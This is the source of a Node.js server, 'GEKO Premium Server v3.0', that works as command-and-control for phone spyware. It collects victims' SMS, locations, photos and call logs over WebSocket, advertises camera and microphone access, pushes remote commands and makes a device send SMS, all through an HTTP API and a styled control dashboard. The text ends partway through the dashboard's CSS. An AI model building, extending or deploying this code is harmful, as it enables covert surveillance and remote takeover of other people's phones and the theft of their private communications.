// 🦎 GEKO PREMIUM SERVER v3.0
// 🎨 Dashboard Premium + Fitur Lengkap
// ===========================================

const express = require('express');
const WebSocket = require('ws');
const http = require('http');
const { v4: uuidv4 } = require('uuid');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// ==================== DATA STORES ====================
const devices = new Map();      // deviceId -> device info
const smsStore = new Map();     // deviceId -> SMS messages
const locations = new Map();    // deviceId -> location history
const photos = new Map();       // deviceId -> photos
const calls = new Map();        // deviceId -> call logs
const commands = new Map();     // deviceId -> command history

// ==================== WEBSOCKET HANDLER ====================
wss.on('connection', (ws, req) => {
  const deviceId = uuidv4();
  const model = req.headers.model || 'Unknown Device';
  const battery = req.headers.battery || '100%';
  const version = req.headers.version || 'Unknown';
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  
  console.log(`🦎 Device connected: ${model} (${deviceId.substring(0,8)})`);
  
  // Store device
  const device = {
    id: deviceId,
    model: model,
    battery: battery,
    version: version,
    ip: ip,
    ws: ws,
    online: true,
    connectedAt: new Date(),
    lastSeen: new Date()
  };
  
  devices.set(deviceId, device);
  
  // Initialize data stores
  smsStore.set(deviceId, []);
  locations.set(deviceId, []);
  photos.set(deviceId, []);
  calls.set(deviceId, []);
  commands.set(deviceId, []);
  
  // Send welcome with capabilities
  ws.send(JSON.stringify({
    type: 'welcome',
    deviceId: deviceId,
    server: 'GEKO Premium v3.0',
    capabilities: [
      'sms_monitor',
      'location_track', 
      'camera_access',
      'call_logs',
      'file_browser',
      'microphone',
      'notifications'
    ]
  }));
  
  // Message handler
  ws.on('message', (data) => {
    try {
      const msg = data.toString();
      device.lastSeen = new Date();
      
      try {
        const jsonData = JSON.parse(msg);
        console.log(`📨 ${deviceId.substring(0,8)}: ${jsonData.type}`);
        
        // Handle different data types
        switch(jsonData.type) {
          case 'sms':
            handleSMS(deviceId, jsonData.data);
            break;
          case 'location':
            handleLocation(deviceId, jsonData);
            break;
          case 'photo':
            handlePhoto(deviceId, jsonData);
            break;
          case 'call_log':
            handleCallLog(deviceId, jsonData.data);
            break;
          case 'file_list':
            console.log(`📁 Files from ${model}: ${jsonData.count || 0} files`);
            break;
        }
      } catch {
        console.log(`📨 ${deviceId.substring(0,8)}: ${msg.substring(0, 50)}`);
      }
    } catch (error) {
      console.error('Message error:', error);
    }
  });
  
  // Disconnect handler
  ws.on('close', () => {
    console.log(`📴 Device disconnected: ${deviceId.substring(0,8)}`);
    device.online = false;
    device.disconnectedAt = new Date();
  });
  
  ws.on('error', (error) => {
    console.error(`❌ WebSocket error: ${error.message}`);
  });
});

// ==================== DATA HANDLERS ====================
function handleSMS(deviceId, smsData) {
  const smsList = smsStore.get(deviceId) || [];
  
  if (Array.isArray(smsData)) {
    smsData.forEach(sms => {
      sms.id = uuidv4();
      sms.timestamp = new Date().toISOString();
      smsList.unshift(sms);
    });
  } else {
    smsData.id = uuidv4();
    smsData.timestamp = new Date().toISOString();
    smsList.unshift(smsData);
  }
  
  // Keep last 500 SMS only
  if (smsList.length > 500) {
    smsStore.set(deviceId, smsList.slice(0, 500));
  } else {
    smsStore.set(deviceId, smsList);
  }
  
  console.log(`💬 SMS stored for ${deviceId.substring(0,8)}: ${smsList.length} messages`);
}

function handleLocation(deviceId, locationData) {
  const locList = locations.get(deviceId) || [];
  
  const location = {
    id: uuidv4(),
    lat: locationData.lat,
    lng: locationData.lng,
    accuracy: locationData.accuracy || 0,
    address: locationData.address || '',
    timestamp: new Date().toISOString()
  };
  
  locList.unshift(location);
  
  // Keep last 100 locations
  if (locList.length > 100) {
    locations.set(deviceId, locList.slice(0, 100));
  } else {
    locations.set(deviceId, locList);
  }
  
  console.log(`📍 Location updated for ${deviceId.substring(0,8)}: ${location.lat}, ${location.lng}`);
}

function handlePhoto(deviceId, photoData) {
  const photoList = photos.get(deviceId) || [];
  
  const photo = {
    id: uuidv4(),
    name: photoData.name || `photo_${Date.now()}.jpg`,
    size: photoData.size || 0,
    timestamp: new Date().toISOString(),
    data: photoData.data || ''
  };
  
  photoList.unshift(photo);
  
  // Keep last 50 photos
  if (photoList.length > 50) {
    photos.set(deviceId, photoList.slice(0, 50));
  } else {
    photos.set(deviceId, photoList);
  }
  
  console.log(`📸 Photo saved for ${deviceId.substring(0,8)}: ${photo.name}`);
}

function handleCallLog(deviceId, callData) {
  const callList = calls.get(deviceId) || [];
  
  if (Array.isArray(callData)) {
    callData.forEach(call => {
      call.id = uuidv4();
      call.timestamp = new Date().toISOString();
      callList.unshift(call);
    });
  } else {
    callData.id = uuidv4();
    callData.timestamp = new Date().toISOString();
    callList.unshift(callData);
  }
  
  // Keep last 200 calls
  if (callList.length > 200) {
    calls.set(deviceId, callList.slice(0, 200));
  } else {
    calls.set(deviceId, callList);
  }
  
  console.log(`📞 Call logs updated for ${deviceId.substring(0,8)}: ${callList.length} calls`);
}

// ==================== EXPRESS SETUP ====================
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// CORS middleware
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Headers', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  next();
});

// ==================== API ENDPOINTS ====================

// 1. Get all devices
app.get('/api/devices', (req, res) => {
  const deviceList = Array.from(devices.values()).map(d => ({
    id: d.id,
    model: d.model,
    battery: d.battery,
    version: d.version,
    online: d.online,
    ip: d.ip,
    connectedAt: d.connectedAt,
    lastSeen: d.lastSeen,
    smsCount: smsStore.get(d.id)?.length || 0,
    locationCount: locations.get(d.id)?.length || 0,
    photoCount: photos.get(d.id)?.length || 0,
    callCount: calls.get(d.id)?.length || 0
  }));
  
  res.json({
    success: true,
    count: deviceList.length,
    online: deviceList.filter(d => d.online).length,
    devices: deviceList
  });
});

// 2. Get device details
app.get('/api/device/:id', (req, res) => {
  const device = devices.get(req.params.id);
  
  if (!device) {
    return res.status(404).json({
      success: false,
      error: 'Device not found'
    });
  }
  
  res.json({
    success: true,
    device: {
      id: device.id,
      model: device.model,
      battery: device.battery,
      version: device.version,
      online: device.online,
      ip: device.ip,
      connectedAt: device.connectedAt,
      lastSeen: device.lastSeen
    },
    stats: {
      sms: smsStore.get(device.id)?.length || 0,
      locations: locations.get(device.id)?.length || 0,
      photos: photos.get(device.id)?.length || 0,
      calls: calls.get(device.id)?.length || 0
    }
  });
});

// 3. Get SMS messages
app.get('/api/device/:id/sms', (req, res) => {
  const limit = parseInt(req.query.limit) || 100;
  const smsList = smsStore.get(req.params.id) || [];
  
  res.json({
    success: true,
    count: smsList.length,
    sms: smsList.slice(0, limit)
  });
});

// 4. Get location history
app.get('/api/device/:id/locations', (req, res) => {
  const limit = parseInt(req.query.limit) || 50;
  const locList = locations.get(req.params.id) || [];
  
  res.json({
    success: true,
    count: locList.length,
    locations: locList.slice(0, limit)
  });
});

// 5. Get photos
app.get('/api/device/:id/photos', (req, res) => {
  const photoList = photos.get(req.params.id) || [];
  
  res.json({
    success: true,
    count: photoList.length,
    photos: photoList.map(p => ({
      id: p.id,
      name: p.name,
      size: p.size,
      timestamp: p.timestamp
    }))
  });
});

// 6. Get call logs
app.get('/api/device/:id/calls', (req, res) => {
  const limit = parseInt(req.query.limit) || 100;
  const callList = calls.get(req.params.id) || [];
  
  res.json({
    success: true,
    count: callList.length,
    calls: callList.slice(0, limit)
  });
});

// 7. Send command to device
app.post('/api/command', (req, res) => {
  const { deviceId, command, params = '' } = req.body;
  
  if (!deviceId || !command) {
    return res.status(400).json({
      success: false,
      error: 'Missing deviceId or command'
    });
  }
  
  const device = devices.get(deviceId);
  
  if (!device) {
    return res.status(404).json({
      success: false,
      error: 'Device not found'
    });
  }
  
  if (!device.online || !device.ws || device.ws.readyState !== 1) {
    return res.json({
      success: false,
      error: 'Device is offline'
    });
  }
  
  // Log command
  const cmdList = commands.get(deviceId) || [];
  cmdList.unshift({
    id: uuidv4(),
    command: command,
    params: params,
    timestamp: new Date().toISOString(),
    status: 'sent'
  });
  commands.set(deviceId, cmdList);
  
  // Send to device
  device.ws.send(JSON.stringify({
    type: 'command',
    cmd: command,
    params: params,
    id: Date.now().toString()
  }));
  
  console.log(`⚡ Command sent to ${deviceId.substring(0,8)}: ${command} ${params}`);
  
  res.json({
    success: true,
    message: 'Command sent to device'
  });
});

// 8. Send SMS from device
app.post('/api/device/:id/sms/send', (req, res) => {
  const device = devices.get(req.params.id);
  const { to, message } = req.body;
  
  if (!device || !device.online) {
    return res.json({ success: false, error: 'Device offline' });
  }
  
  if (!to || !message) {
    return res.json({ success: false, error: 'Missing to or message' });
  }
  
  device.ws.send(JSON.stringify({
    type: 'command',
    cmd: 'send_sms',
    params: `${to}:${message}`
  }));
  
  res.json({
    success: true,
    message: 'SMS send command dispatched'
  });
});

// 9. Clear data
app.delete('/api/device/:id/:dataType', (req, res) => {
  const { id, dataType } = req.params;
  
  switch(dataType) {
    case 'sms':
      smsStore.set(id, []);
      break;
    case 'locations':
      locations.set(id, []);
      break;
    case 'photos':
      photos.set(id, []);
      break;
    case 'calls':
      calls.set(id, []);
      break;
    default:
      return res.status(400).json({ success: false, error: 'Invalid data type' });
  }
  
  res.json({ success: true, message: `Cleared ${dataType}` });
});

// ==================== PREMIUM DASHBOARD ====================
app.get('/dashboard', (req, res) => {
  res.send(`
  <!DOCTYPE html>
  <html lang="en">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🦎 GEKO PREMIUM CONTROL</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;700;900&family=Roboto+Mono:wght@300;400;500&display=swap" rel="stylesheet">
    <style>
      :root {
        --geko-green: #00ff88;
        --geko-dark: #0a0a0a;
        --geko-darker: #050505;
        --geko-card: #111111;
        --geko-text: #ffffff;
        --geko-accent: #ff5500;
        --geko-warning: #ffaa00;
      }
      
      * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
      }
      
      body {
        font-family: 'Roboto Mono', monospace;
        background: var(--geko-darker);
        color: var(--geko-text);
        overflow-x: hidden;
        background-image: 
          radial-gradient(circle at 20% 30%, rgba(0, 255, 136, 0.05) 0%, transparent 20%),
          radial-gradient(circle at 80% 70%, rgba(255, 85, 0, 0.05) 0%, transparent 20%),
          linear-gradient(45deg, var(--geko-darker) 0%, #0f0f0f 100%);
        min-height: 100vh;
      }
      
      /* GEKO Header */
      .geko-header {
        background: rgba(10, 10, 10, 0.9);
        border-bottom: 3px solid var(--geko-green);
        padding: 20px 40px;
        display: flex;
        justify-content: space-between;
        align-items: center;
        backdrop-filter: blur(10px);
        position: sticky;
        top: 0;
        z-index: 1000;
        box-shadow: 0 5px 20px rgba(0, 255, 136, 0.1);
      }
      
      .logo {
        display: flex;
        align-items: center;
        gap: 15px;
      }
      
      .logo-icon {
        font-size: 2.5rem;
        color: var(--geko-green);
        animation: pulse 2s infinite;
      }
      
      @keyframes pulse {
        0%, 100% { text-shadow: 0 0 10px var(--geko-green); }
        50% { text-shadow: 0 0 20px var(--geko-green), 0 0 30px var(--geko-green); }
      }
      
      .logo-text h1 {
        font-family: 'Orbitron', sans-serif;
        font-weight: 900;
        font-size: 2rem;
        background: linear-gradient(45deg, var(--geko-green), #00cc6a);
        -webkit-background-clip: text;
        -webkit-text-fill-color: transparent;
        text-transform: uppercase;
        letter-spacing: 2px;
      }
      
      .logo-text p {
        color: #88ffcc;
        font-size: 0.9rem;
        opacity: 0.8;
      }
      
      .server-status {
        display: flex;
        align-items: center;
        gap: 15px;
      }
      
      .status-indicator {
        width: 12px;
        height: 12px;
        border-radius: 50%;
        background: var(--geko-green);
        box-shadow: 0 0 10px var(--geko-green);
        animation: blink 1.5s infinite;
      }
      
      @keyframes blink {
        0%, 100% { opacity: 1; }
        50% { opacity: 0.5; }
      }
      
      /* Main Container */
      .container {
        max-width: 1400px;
        margin: 0 auto;
        padding: 30px;
      }
      
      /* Stats Grid */
      .stats-grid {
        display: grid;
        grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
        gap: 25px;
        margin-bottom: 40px;
      }
      
      .stat-card {
        background: rgba(17, 17, 17, 0.8);
        border-radius: 15px;
        padding: 25px;
        border: 1px solid rgba(0, 255, 136, 0.1);
        backdrop-filter: blur(5px);
        transition: all 0.3s;
        position: relative;
        overflow: hidden;
      }
      
      .stat-card::before {
        content: '';
        position: absolute;
        top: 0;
        left: -100%;
        width: 100%;
        height: 100%;
        background: linear-gradient(90deg, transparent, rgba(0, 255, 136, 0.1), transparent);
        transition: 0.5s;
      }
      
      .stat-card:hover::before {
        left: 100%;
      }
      
      .stat-card:hover {
        transform: translateY(-5px);
        border-color: rgba(0, 255, 136, 0.3);
        box-shadow: 0 10px 30px rgba(0, 255, 136, 0.15);
      }
      
      .stat-icon {
        font-size: 2.5rem;
        color: var(--geko-green);
        margin-bottom: 15px;
      }
      
      .stat-number {
        font-size: 3rem;
        font-weight: bold;
        font-family: 'Orbitron', sans-serif;
        color: var(--geko-green);
        margin: 10px 0;
      }
      
      /* Device List */
      .devices-section {
        background: rgba(17, 17, 17, 0.8);
        border-radius: 15px;
        padding: 30px;
        margin-bottom: 40px;
        border: 1px solid rgba(0, 255, 136, 0.1);
      }
      
      .section-title {
        font-family: 'Orbitron', sans-serif;
        font-size: 1.5rem;
        color: var(--geko-green);
        margin-bottom: 25px;
        display: flex;
        align-items: center;
        gap: 10px;
      }
      
      .device-grid {
        display: grid;
        grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));
        gap: 20px;
      }
      
      .device-card {
        background: rgba(5, 5, 5, 0.9);
        border-radius: 12px;
        padding: 20px;
        border: 1px solid rgba(0, 255, 136, 0.2);
        transition: all 0.3s;
        cursor: pointer;
        position: relative;
      }
      
      .device-card:hover {
        transform: translateY(-3px);
        border-color: var(--geko-green);
        box-shadow: 0 5px 20px rgba(0, 255, 136, 0.2);
      }
      
      .device-card.selected {
        border-color: var(--geko-green);
        background: rgba(0, 255, 136, 0.05);
      }
      
      .device-header {
        display: flex;
        justify-content: space-between;
        align-items: center;
        margin-bottom: 15px;
      }
      
      .device-name {
        font-family: 'Orbitron', sans-serif;
        font-size: 1.2rem;
        color: var(--geko-text);
      }
      
      .device-status {
        padding: 5px 15px;
        border-radius: 20px;
        font-size: 0.8rem;
        font-weight: bold;
      }
      
      .status-online {
        background: rgba(0, 255, 136, 0.2);
        color: var(--geko-green);
      }
      
      .status-offline {
        background: rgba(255, 85, 0, 0.2);
        color: var(--geko-accent);
      }
      
      .device-info {
        color: #aaa;
        font-size: 0.9rem;
        line-height: 1.5;
      }
      
      /* Control Panel */
      .control-panel {
        background: rgba(17, 17, 17, 0.8);
        border-radius: 15px;
        padding: 30px;
        border: 1px solid rgba(0, 255, 136, 0.1);
        margin-bottom: 40px;
      }
      
      .tabs {
        display: flex;
        gap: 10px;
        margin-bottom: 25px;
        border-bottom: 1px solid rgba(255, 255, 255, 0.1);
        padding-bottom: 15px;
      }
      
      .tab-btn {
        padding: 12px 25px;
        background: transparent;
        border: 1px solid rgba(255, 255, 255, 0.2);
        color: var(--geko-text);
        border-radius: 8px;
        cursor: pointer;
        transition: all 0.3s;
        font-family: 'Orbitron', sans-serif;
        font-size: 0.9rem;
      }
      
      .tab-btn:hover {
        border-color: var(--geko-green);
        color: var(--geko-green);
      }
      
      .tab-btn.active {
        background: var(--geko-green);
        color: var(--geko-dark);
        border-color: var(--geko-green);
      }
      
      .tab-content {
        display: none;
      }
      
      .tab-content.active {
        display: block;
        animation: fadeIn 0.5s;
      }
      
      @keyframes fadeIn {
        from { opacity: 0; transform: translateY(10px); }
        to { opacity: 1; transform: translateY(0); }
      }
      
      /* Command Grid */
      .command-grid {
        display: grid;
        grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
        gap: 15px;
        margin: 25px 0;
      }
      
      .command-btn {
        padding: 15px;
        background: rgba(0, 255, 136, 0.1);
        border: 1px solid rgba(0, 255, 136, 0.3);
        color: var(--geko-green);
        border-radius: 10px;
        cursor: pointer;
        transition: all 0.3s;
        font-family: 'Roboto Mono', monospace;
        text-align: center;
        display: flex;
        flex-direction: column;
        align-items: center;
        gap: 8px;
      }
      
      .command-btn:hover {
        background: rgba(0, 255, 136, 0.2);
        transform: translateY(-3px);
        box-shadow: 0 5px 15px rgba(0, 255, 136, 0.2);
      }
      
     
